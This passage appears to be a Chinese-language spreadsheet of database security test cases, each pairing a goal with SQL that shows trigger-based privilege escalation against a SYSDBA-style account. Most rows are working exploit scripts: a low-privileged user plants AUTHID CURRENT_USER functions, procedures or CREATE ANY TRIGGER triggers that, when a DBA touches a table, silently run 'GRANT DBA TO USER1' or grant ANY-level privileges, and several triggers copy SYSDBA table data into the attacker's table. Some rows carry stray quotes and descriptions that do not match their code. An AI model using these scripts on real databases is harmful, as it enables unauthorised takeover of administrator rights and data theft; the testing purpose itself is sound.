SELECT * FROM USER2.L2;"
同一用户下的表的数据：user1下两张表，也可以发现触发器的存在,,
,,
,,
,,
生成一组测试用例，能够展现触发器存在传递权限功能,user1用户拥有user2用户表的插入权限，user2用户拥有user3用户表的插入权限，在两个用户分别创建触发器之后，user1用户通过触发器可以将数据插入到user3用户的表中，尽管没有插入权限,"‘--user3用户
--创建表
CREATE TABLE l3 (id int, name varchar(20));

--授予user2用户表l3的插入权限
GRANT INSERT ON l3 TO user2;

--user2用户
--创建表
CREATE TABLE l2 (id int, name varchar(20));

--授予user1用户表l2的插入权限
GRANT INSERT ON l2 TO user1;

--创建触发器
CREATE OR REPLACE TRIGGER INSERT_TO_USER3_l3
AFTER INSERT ON l2
FOR EACH ROW 
BEGIN
 INSERT INTO USER3.l3 VALUES(NEW.ID,NEW.NAME);
END;

---user1用户
--创建表
CREATE TABLE l1 (id int, name varchar(20));

--插入数据
INSERT INTO l1 values(1,'user1');
INSERT INTO l1 values(2,'user1');
GRANT INSERT ON l1 TO user2;
REVOKE INSERT ON l1 FROM  user2;

--创建触发器
create or replace trigger insert_user2_l2
after insert on l1
for each row 
begin
 insert into user2.l2 values(new.id,new.name);
end;

--测试插入数据
INSERT INTO user1.l1 values(3,'user1');

--user3用户查询结果
SELECT * FROM l3;"
,,
,,
,,
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权DBA用户表的插入权限，创建插入前触发器，执行该函数，使用DBA用户插入user1用户的表中，触发触发器调用函数进行授权,"‘--DBA用户
--创建表
CREATE TABLE SYSDBA.TABLE1(ID INT, NAME VARCHAR(20));

--USER1用户
--创建表
CREATE TABLE T1(ID VARCHAR(50));

--创建授权函数
CREATE OR REPLACE FUNCTION CREATE_DBA_TABLE
RETURN A80
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT INSERT ON SYSDBA.TABLE1 TO USER1';
    COMMIT;
    RETURN 'INSERTED';
END;

--创建触发器，调用函数
CREATE OR REPLACE TRIGGER INSERT_CREATE
BEFORE INSERT ON USER1.T1
FOR EACH ROW
BEGIN
 --调用函数
 CALL CREATE_DBA_TABLE();
END;

--DBA用户
--插入数据，触发触发器进行授权
INSERT INTO USER1.T1 VALUES('SYSDBA');

--USER1用户
--查看权限
SELECT * FROM USER_TAB_PRIVS;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权任意该用户未有的权限，创建插入后触发器，执行该函数，使用DBA用户插入user1用户的表中，触发触发器调用函数进行授权,"--USER1用户
--创建表
CREATE TABLE T2(ID INT, NAME VARCHAR(20));

--创建授权函数
CREATE OR REPLACE FUNCTION GRANT_PRIVILEGE
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT CREATE ANY TRIGGER TO USER1';
    COMMIT;
    RETURN 'GRANTED';
END;

--创建触发器，调用函数
CREATE OR REPLACE TRIGGER INSERT_GRANT
AFTER INSERT ON USER1.T2
FOR EACH ROW
BEGIN
 --调用函数
 CALL GRANT_PRIVILEGE();
END;

--DBA用户
--插入数据，触发触发器进行授权
INSERT INTO USER1.T2 VALUES(1, 'SYSDBA');

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权任意该用户未有的权限，创建更新前触发器，执行该函数。使用DBA用户更新user1用户的表，触发触发器调用函数进行授权,"‘--DBA用户
--创建表
CREATE TABLE SYSDBA.TABLE1(ID INT, NAME VARCHAR(20));

--USER1用户
--创建表
CREATE TABLE T3(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO T3 VALUES(1, 'USER1');

--创建授权函数
CREATE OR REPLACE FUNCTION GRANT_ALL_PRIVILEGE
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT ALL PRIVILEGES ON SYSDBA.TABLE1 TO USER1';
    COMMIT;
    RETURN 'GRANTED';
END;

--创建触发器，调用函数
CREATE OR REPLACE TRIGGER UPDATE_GRANT_ALL
BEFORE UPDATE ON USER1.T3
FOR EACH ROW
BEGIN
 --调用函数
 CALL GRANT_ALL_PRIVILEGE();
END;

--DBA用户
--更新数据，触发触发器进行授权
UPDATE USER1.T3 SET NAME = 'SYSDBA' WHERE ID = 1;

--USER1用户
--查看权限
SELECT * FROM USER_TAB_PRIVS;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权任意该用户未有的权限，创建更新后触发器，执行该函数。使用DBA用户更新user1用户的表，触发触发器调用函数进行授权,"‘--USER1用户
--创建表
CREATE TABLE T4(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO T4 VALUES(1, 'USER1');

--创建授权函数
CREATE OR REPLACE FUNCTION GRANT_TABLESPACE
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT CREATE TABLESPACE TO USER1';
    COMMIT;
    RETURN 'GRANTED';
END;

--创建触发器，调用函数
CREATE OR REPLACE TRIGGER UPDATE_GRANT_TABLESPACE
AFTER UPDATE ON USER1.T4
FOR EACH ROW
BEGIN
 --调用函数
 CALL GRANT_TABLESPACE();
END;

--DBA用户
--更新数据，触发触发器进行授权
UPDATE USER1.T4 SET NAME = 'SYSDBA' WHERE ID = 1;

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权任意该用户未有的权限，创建删除前触发器，执行该函数。使用DBA用户删除user1用户的表，触发触发器调用函数进行授权,"--USER1用户
--创建表
CREATE TABLE T5(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO T5 VALUES(1, 'USER1');

--创建授权函数
CREATE OR REPLACE FUNCTION GRANT_ANY
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT INSERT ANY TABLE TO USER1';
    COMMIT;
    RETURN 'GRANTED';
END;

--创建触发器，调用函数
CREATE OR REPLACE TRIGGER DELETE_GRANT_ANY
BEFORE DELETE ON USER1.T5
FOR EACH ROW
BEGIN
 --调用函数
 CALL GRANT_ANY();
END;

--DBA用户
--删除数据，触发触发器进行授权
DELETE FROM USER1.T5 WHERE ID = 1

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权任意该用户未有的权限，创建删除后触发器，执行该函数。使用DBA用户删除user1用户的表，触发触发器调用函数进行授权,"--USER1用户
--创建表
CREATE TABLE T6(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO T6 VALUES(1, 'USER1');

--创建授权函数
CREATE OR REPLACE FUNCTION GRANT_ANY
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT GRANT ANY TABLE TO USER1';
    COMMIT;
    RETURN 'GRANTED';
END;

--创建触发器，调用函数
CREATE OR REPLACE TRIGGER DELETE_GRANT_ANY
BEFORE DELETE ON USER1.T6
FOR EACH ROW
BEGIN
 --调用函数
 CALL GRANT_ANY();
END;

--DBA用户
--删除数据，触发触发器进行授权
DELETE FROM USER1.T6 WHERE ID = 1;

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权任意该用户未有的权限，创建插入前触发器，执行该存储过程，使用DBA用户插入user1用户的表中，触发触发器调用存储过程进行授权,"--USER1用户
--创建表
CREATE TABLE T1(ID VARCHAR(50));

--创建授权存储过程
CREATE OR REPLACE PROCEDURE DUMP_ANY_TABLE
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT DUMP ANY TABLE TO USER1';
    COMMIT;
END;

--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER INSERT_DUMP
BEFORE INSERT ON USER1.T1
FOR EACH ROW
BEGIN
 --调用存储过程
 CALL DUMP_ANY_TABLE();
END;

--DBA用户
--插入数据，触发触发器进行授权
INSERT INTO USER1.T1 VALUES('SYSDBA');

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权任意该用户未有的权限，创建插入后触发器，执行该存储过程，使用DBA用户插入user1用户的表中，触发触发器调用存储过程进行授权,"--USER1用户
--创建表
CREATE TABLE T2(ID INT, NAME VARCHAR(20));

--创建授权存储过程
CREATE OR REPLACE PROCEDURE ADMIN_ANY_ROLE
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT ADMIN ANY ROLE TO USER1 WITH ADMIN OPTION';
    COMMIT;
END;

--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER INSERT_ADMIN_ANY_ROLE
AFTER INSERT ON USER1.T2
FOR EACH ROW
BEGIN
 --调用存储过程
 CALL ADMIN_ANY_ROLE();
END;

--DBA用户
--插入数据，触发触发器进行授权
INSERT INTO USER1.T2 VALUES(1, 'SYSDBA');

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权任意该用户未有的权限，创建更新前触发器，执行该存储过程。使用DBA用户更新user1用户的表，触发触发器调用存储过程进行授权,"--USER1用户
--创建表
CREATE TABLE T3(ID VARCHAR(50));

--插入数据
INSERT INTO T3 VALUES('USER1');

--创建授权存储过程
CREATE OR REPLACE PROCEDURE REFERENCES_ANY_TABLE
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT REFERENCES ANY TABLE TO USER1';
    COMMIT;
END;

--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER UPDATE_REFERENCES
BEFORE UPDATE ON USER1.T3
FOR EACH ROW
BEGIN
 --调用存储过程
 CALL REFERENCES_ANY_TABLE();
END;

--DBA用户
--更新数据，触发触发器进行授权
UPDATE USER1.T3 SET ID = 'SYSDBA';

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权任意该用户未有的权限，创建更新后触发器，执行该存储过程。使用DBA用户更新user1用户的表，触发触发器调用存储过程进行授权,"--USER1用户
--创建表
CREATE TABLE T4(ID VARCHAR(50));

--插入数据
INSERT INTO T4 VALUES('USER1');

--创建授权存储过程
CREATE OR REPLACE PROCEDURE CREATE_USER
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT CREATE USER TO USER1';
    COMMIT;
END;

--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER UPDATE_CREATE_USER
AFTER UPDATE ON USER1.T4
FOR EACH ROW
BEGIN
 --调用存储过程
 CALL CREATE_USER();
END;

--DBA用户
--更新数据，触发触发器进行授权
UPDATE USER1.T4 SET ID = 'SYSDBA';

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权任意该用户未有的权限，创建删除前触发器，执行该存储过程。使用DBA用户删除user1用户的表，触发触发器调用存储过程进行授权,"‘--USER1用户
--创建表
CREATE TABLE T5(ID INT, NAME VARCHAR(50));

--插入数据
INSERT INTO T5 VALUES(1, 'USER1');

--创建授权存储过程
CREATE OR REPLACE PROCEDURE CREATE_ANY_PROCEDURE
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT CREATE ANY PROCEDURE TO USER1';
    COMMIT;
END;

--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER DELETE_CREATE_ANY_PROCEDURE
BEFORE DELETE ON USER1.T5
FOR EACH ROW
BEGIN
 --调用存储过程
 CALL CREATE_ANY_PROCEDURE();
END;

--DBA用户
--删除数据，触发触发器进行授权
DELETE FROM USER1.T5 WHERE ID = 1;

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权任意该用户未有的权限，创建删除后触发器，执行该存储过程。使用DBA用户删除user1用户的表，触发触发器调用存储过程进行授权,"--USER1用户
--创建表
CREATE TABLE T6(ID INT, NAME VARCHAR(50));

--插入数据
INSERT INTO T6 VALUES(1, 'USER1');

--创建授权存储过程
CREATE OR REPLACE PROCEDURE GRANT_ANY_PROCEDURE
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT GRANT ANY PROCEDURE TO USER1';
    COMMIT;
END;

--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER DELETE_GRANT_ANY_PROCEDURE
AFTER DELETE ON USER1.T6
FOR EACH ROW
BEGIN
 --调用存储过程
 CALL GRANT_ANY_PROCEDURE();
END;

--DBA用户
--删除数据，触发触发器进行授权
DELETE FROM USER1.T6 WHERE ID = 1;

--USER1用户
--查看权限
SELECT * FROM USER_SYS_PRIVS;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权DBA，创建插入型触发器，执行该函数，使用DBA用户插入user1用户的表中，触发触发器调用函数进行提权,"‘--user1用户
--创建表
CREATE TABLE T1(ID VARCHAR(50));
--插入数据
INSERT INTO T1 VALUES('user1');
--创建提权函数
CREATE OR REPLACE FUNCTION grant_dba_to_user1
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'grant dba to user1';
    COMMIT;
    RETURN 'Granted';
END;
--创建触发器，调用函数
CREATE OR REPLACE TRIGGER insert_get_dba
    AFTER INSERT ON user1.t1
    FOR EACH ROW
BEGIN
 --调用函数
 call grant_dba_to_user1();
END;

--DBA用户
--插入数据，触发触发器进行授权
INSERT INTO user1.T1 VALUES('sysdba');

--user1用户
--查看权限
SELECT * FROM user_role_privs;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权DBA，创建更新型触发器，执行该函数。使用DBA用户更新user1用户的表，触发触发器调用函数进行提权,"--user1用户
--创建表
CREATE TABLE T2(ID int, name varchar(20));
--插入数据
INSERT INTO T2 VALUES(1, 'user1');
--创建提权函数
CREATE OR REPLACE FUNCTION grant_dba_to_user1
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'grant dba to user1';
    COMMIT;
    RETURN 'Granted';
END;
--创建触发器，调用函数
CREATE OR REPLACE TRIGGER update_get_dba
AFTER UPDATE ON user1.t2
FOR EACH ROW
BEGIN
 --调用函数
 call grant_dba_to_user1();
END;

--DBA用户
--更新数据，触发触发器进行授权
UPDATE user1.T2 SET name = 'sysdba' WHERE id = 1;

--user1用户
--查看权限
SELECT * FROM user_role_privs;"
生成一组测试用例，能够反应触发器通过调用函数实现间接提权功能,user1用户是普通用户，创建函数执行授权DBA，创建删除型触发器，执行该函数。使用DBA用户删除user1用户的表，触发触发器调用函数进行提权,"--user1用户
--创建表
CREATE TABLE T3(ID int, name varchar(20));
--插入数据
INSERT INTO T3 VALUES(1, 'user1');
--创建提权函数
CREATE OR REPLACE FUNCTION grant_dba_to_user1
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'grant dba to user1';
    COMMIT;
    RETURN 'Granted';
END;
--创建触发器，调用函数
CREATE OR REPLACE TRIGGER delete_get_dba
AFTER DELETE ON user1.t3
FOR EACH ROW
BEGIN
 --调用函数
 call grant_dba_to_user1();
END;

--DBA用户
--删除数据，触发触发器进行授权
DELETE FROM user1.t3 WHERE id = 1;

--user1用户
--查看权限
SELECT * FROM user_role_privs;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权DBA，创建插入型触发器，执行该存储过程，使用DBA用户插入user1用户的表中，触发触发器调用存储过程进行提权,"--user1用户
--创建表
CREATE TABLE T4(ID VARCHAR(50));
--插入数据
INSERT INTO T4 VALUES('user1');
--创建提权存储过程
CREATE OR REPLACE PROCEDURE grant_dba_to_user1
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'grant dba to user1';
    COMMIT;
END;
--创建触发器，调用函数
CREATE OR REPLACE TRIGGER insert_get_dba
    AFTER INSERT ON user1.T4
    FOR EACH ROW
BEGIN
 --调用存储过程
 call grant_dba_to_user1();
END;

--DBA用户
--插入数据，触发触发器进行授权
INSERT INTO user1.T4 VALUES('sysdba');

--user1用户
--查看权限
SELECT * FROM user_role_privs;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权DBA，创建插入型触发器，执行该存储过程。使用DBA用户更新user1用户的表，触发触发器调用存储过程进行提权,"--user1用户
--创建表
CREATE TABLE T5(ID int, name varchar(20));
--插入数据
INSERT INTO T5 VALUES(1, 'user1');
--创建提权存储过程
CREATE OR REPLACE PROCEDURE grant_dba_to_user1
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'grant dba to user1';
    COMMIT;
END;
--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER update_get_dba_1
AFTER UPDATE ON user1.t5
FOR EACH ROW
BEGIN
 --调用存储过程
 call grant_dba_to_user1();
END;

--DBA用户
--更新数据，触发触发器进行授权
UPDATE user1.T5 SET name = 'sysdba' WHERE id = 1;

--user1用户
--查看权限
SELECT * FROM user_role_privs;"
生成一组测试用例，能够反应触发器通过调用存储过程实现间接提权功能,user1用户是普通用户，创建存储过程执行授权DBA，创建插入型触发器，执行该存储过程。使用DBA用户删除user1用户的表，触发触发器调用存储过程进行提权,"--user1用户
--创建表
CREATE TABLE T6(ID int, name varchar(20));
--插入数据
INSERT INTO T6 VALUES(1, 'user1');
--创建提权存储过程
CREATE OR REPLACE PROCEDURE grant_dba_to_user1
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'grant dba to user1';
    COMMIT;
END;
--创建触发器，调用存储过程
CREATE OR REPLACE TRIGGER delete_get_dba
AFTER DELETE ON user1.t6
FOR EACH ROW
BEGIN
 --调用存储过程
 call grant_dba_to_user1();
END;

--DBA用户
--删除数据，触发触发器进行授权
DELETE FROM user1.t6 WHERE id = 1;

--user1用户
--查看权限
SELECT * FROM user_role_privs;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在插入到sysdba用户表之时，将数据复制到自己的表中。sysdba用户插入数据触发触发器，执行授权命令。,"‘--SYSDB用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--USER1
--创建表
CREATE TABLE T2(ID INT, NAME VARCHAR(20));

--创建触发器
CREATE OR REPLACE TRIGGER COPY_TABLE_DATA
AFTER INSERT ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 INSERT INTO USER1.T2 SELECT * FROM SYSDBA.T1;
END;

--SYSDBA用户
--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');
INSERT INTO SYSDBA.T1 VALUES(2, 'SYSDBA');

--USER1用户
--查询该自己的表
SELECT * FROM USER1.T2;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在更新sysdba用户表时，将数据复制到自己的表中。sysdba用户更新数据触发触发器，执行授权命令。,"‘--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');
INSERT INTO SYSDBA.T1 VALUES(2, 'SYSDBA');

--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--USER1
--创建表
CREATE TABLE T2(ID INT, NAME VARCHAR(20));

--创建触发器
CREATE OR REPLACE TRIGGER COPY_TABLE_DATA
AFTER UPDATE ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 INSERT INTO USER1.T2 SELECT * FROM SYSDBA.T1;
END;

--SYSDBA用户
--更新表，以触发触发器
UPDATE SYSDBA.T1 SET NAME = 'SYSDBA1' WHERE ID = 1;

--USER1用户
--查询该自己的表
SELECT * FROM USER1.T2;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在删除sysdba用户表时，将数据复制到自己的表中。sysdba用户删除数据触发触发器，执行授权命令。,"‘--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');
INSERT INTO SYSDBA.T1 VALUES(2, 'SYSDBA');

--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--USER1
--创建触发器
CREATE OR REPLACE TRIGGER COPY_TABLE_DATA
BEFORE DELETE ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 INSERT INTO USER1.T2 SELECT * FROM SYSDBA.T1;
END;

--SYSDBA用户
--删除表，以触发触发器
DELETE FROM sysdba.t1 WHERE id = 1;

--USER1用户
--查询该自己的表
SELECT * FROM USER1.T2;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在插入sysdba用户表时，授权未有的权限。sysdba用户插入数据触发触发器，执行授权命令,"--SYSDB用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--USER1
--创建触发器
CREATE OR REPLACE TRIGGER GRANT_SELECT
BEFORE INSERT ON SYSDBA.T1
FOR EACH ROW
DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT SELECT ON T1 TO USER1';
END;

--SYSDBA用户
--插入数据，以触发触发器
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--USER1用户
--查询授权结果
SELECT * FROM USER_TAB_PRIVS;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在更新sysdba用户表时，授权未有的权限。sysdba用户更新数据触发触发器，执行授权命令,"‘--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');
INSERT INTO SYSDBA.T1 VALUES(2, 'SYSDBA');

--USER1
--创建表
CREATE TABLE T2(ID INT, NAME VARCHAR(20));

--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_CREATE_ANY_PROCEDURE
BEFORE UPDATE ON SYSDBA.T1
FOR EACH ROW
DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT CREATE ANY PROCEDURE TO USER1';
END;

--SYSDBA用户
--更新表，以触发触发器
UPDATE SYSDBA.T1 SET NAME = 'SYSDBA1' WHERE ID = 1;

--USER1用户
--查询授权结果
SELECT * FROM USER_SYS_PRIVS;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在删除sysdba用户表时，授权未有的权限。sysdba用户删除数据触发触发器，执行授权命令,"--SYSDB用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--USER1
--创建触发器
CREATE OR REPLACE TRIGGER DELETE_ALTER_ANY_TABLE
BEFORE DELETE ON SYSDBA.T1
FOR EACH ROW
DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT ALTER ANY TABLE TO USER1';
END;

--SYSDBA用户
--删除表，以触发触发器
DELETE FROM SYSDBA.T1 WHERE ID = 1;

--USER1用户
--查询授权结果
SELECT * FROM USER_SYS_PRIVS;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在插入sysdba用户表时，授权DBA权限。sysdba用户插入数据触发触发器，执行授权命令,"--SYSDB用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--USER1
--创建触发器
CREATE OR REPLACE TRIGGER GRANT_DBA
BEFORE INSERT ON SYSDBA.T1
FOR EACH ROW
DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT DBA TO USER1';
END;

--SYSDBA用户
--插入数据，以触发触发器
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--USER1用户
--查询授权结果
SELECT * FROM USER_ROLE_PRIVS;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在插入sysdba用户表时，调用存储过程授权普通用户未有的权限，sysdba用户插入数据触发触发器，执行授权命令,"‘--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--USER1
--创建存储过程
CREATE OR REPLACE PROCEDURE GRANT_CREATE_ANY_TABLE
AUTHID CURRENT_USER
IS 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT CREATE ANY TABLE TO USER1';
END;

--创建触发器
CREATE OR REPLACE TRIGGER TRI_GRANT
BEFORE INSERT ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 USER1.GRANT_CREATE_ANY_TABLE();
END;

--sysdba用户
--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--USER1用户
--查询授权结果
SELECT * FROM USER_ROLE_PRIVS;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，通过给SYSDBA用户创建触发器，在更新sysdba用户表时，调用存储过程授权DBA权限，sysdba用户更新数据触发触发器，执行授权命令,"--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;
--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--USER1
--创建存储过程
CREATE OR REPLACE PROCEDURE GRANT_DBA
AUTHID CURRENT_USER
IS 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT DBA TO USER1';
END;

--创建触发器
CREATE OR REPLACE TRIGGER TRI_GRANT
BEFORE UPDATE ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 USER1.GRANT_DBA();
END;

--sysdba用户
--更新数据，触发触发器
UPDATE SYSDBA.T1 SET NAME = 'SYSDBA1' WHERE ID = 1;

--USER1用户
--查询授权结果
SELECT * FROM USER_ROLE_PRIVS;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，以及sysdba用户表上的插入权限，通过给SYSDBA用户的该表创建触发器，在插入sysdba用户的表时，执行授权DBA命令。user1用户执行插入命令，触发授权操作。,"‘--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));

--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;

--授权插入权限
GRANT INSERT ON SYSDBA.T1 TO USER1;

--user1用户
--创建触发器
CREATE OR REPLACE TRIGGER TRI_GRANT
BEFORE INSERT ON SYSDBA.T1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT DBA TO USER1';
END;

--插入数据，以触发触发器
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--查询授权结果
SELECT * FROM USER_ROLE_PRIVS;
"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，以及sysdba用户表上的更新权限，通过给SYSDBA用户的该表创建触发器，在更新sysdba用户的表时，执行授权命令。user1用户执行更新命令，触发授权操作。,"--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;
--授权更新权限
GRANT UPDATE ON SYSDBA.T1 TO USER1;
--插入数据
